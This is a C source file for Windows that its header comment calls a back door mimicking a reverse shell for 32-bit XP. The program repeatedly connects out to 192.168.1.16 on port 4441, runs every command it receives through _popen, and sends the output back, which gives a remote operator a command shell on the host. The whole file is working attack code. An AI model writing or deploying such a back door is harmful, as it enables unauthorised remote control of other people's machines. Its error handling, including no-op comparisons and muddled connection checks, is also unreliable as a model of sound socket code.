/*
 * this is for a mimic of a a reverse shell on windows.
 * it should be as a daemon but i did not start looking for that.
 * this back door should work on 32bit xp's.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define BUFSIZE 1024
#define str(a) #a
#define xstr(a) str(a)

int main(int argc, char * argv[])
{
	while(1){
		WSADATA wsa;
		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
			fprintf(stderr, "Client : Error at wsastartup.\n");
		}

		/* socket */
		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET){
			fprintf(stderr, "Client : socket() - Error at socket(): %ld\n",
			WSAGetLastError());
			WSACleanup();
			return -1;
		}

		/*connect*/
		int cn;
		FILE   *pPipe;
		int bytesSent;
		int bytesRecv;
		char buf[BUFSIZE] = "";
		char prompt[9] = "<p4p1 /> ";

		bytesSent = 0;
		bytesRecv = SOCKET_ERROR;
	
		struct sockaddr_in client;
		client.sin_family = AF_INET;
		client.sin_addr.s_addr = inet_addr(xstr(192.168.1.16));
		client.sin_port = htons(4441);

		/*pointers*/
		int * pbs = &bytesSent;
		int * pbr = &bytesRecv;


		do{
			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
		} while( cn == SOCKET_ERROR);

		while(1){
			/*send & recv*/
			*pbs = send(s, prompt, sizeof(prompt), 0);
	                if(*pbs == SOCKET_ERROR) { //server disconnected!
	                        cn == SOCKET_ERROR;
	                        if(WSAGetLastError() != WSAECONNREFUSED
	                        || WSAGetLastError() == WSAECONNRESET){
					break;
	                        } else {
	                                printf("connection refused\n");
	                                return -1;
	                        }
	                }
			*pbr = SOCKET_ERROR;

			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					break;
				}

				if(bytesRecv < 0){
					return -1;
				} else {
					/*process received data*/
					if( (pPipe = _popen( buf, "rt" )) == NULL ){
						memset(buf, 0, BUFSIZE);
						strcpy(buf, "error in command");
					} else {
						memset(buf, 0, BUFSIZE);
						while(fgets(buf, 128, pPipe))
							;
					}
				}
			}
		
			//memset(buf, 0, BUFSIZE);

			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) { //server disconnected!
				cn == SOCKET_ERROR;
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					break;
				} else {
					printf("connection refused\n");
					return -1;
				}
			}
			*pbr = SOCKET_ERROR;
		}

		WSACleanup();
		_pclose(pPipe);
	}
	return 0;
}
